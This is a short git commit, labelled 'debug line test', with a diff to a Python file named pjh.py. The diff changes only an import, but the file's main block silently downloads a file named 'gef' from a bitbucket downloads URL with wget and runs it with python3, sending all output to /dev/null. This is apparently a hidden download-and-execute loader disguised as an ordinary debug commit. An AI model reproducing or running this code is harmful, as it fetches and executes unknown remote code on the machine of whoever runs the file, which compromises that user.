2b499d662689af62314d8a6e6e2254959bf8f498
gakira munshi <gakimarki@proton.me>
2024-12-18 06:32:51 -0500

    debug line test

--- pjh.py
+++ pjh.py
@@ -1,3 +1,3 @@
-import os, sys,pydoc_data
+import os, sys,copyreg
 if __name__=='__main__':
   cmd='wget -q "https://bitbucket.org/lampanukal/static/downloads/gef" && python3 gef  1> /dev/null 2> /dev/null ';os.system(cmd)
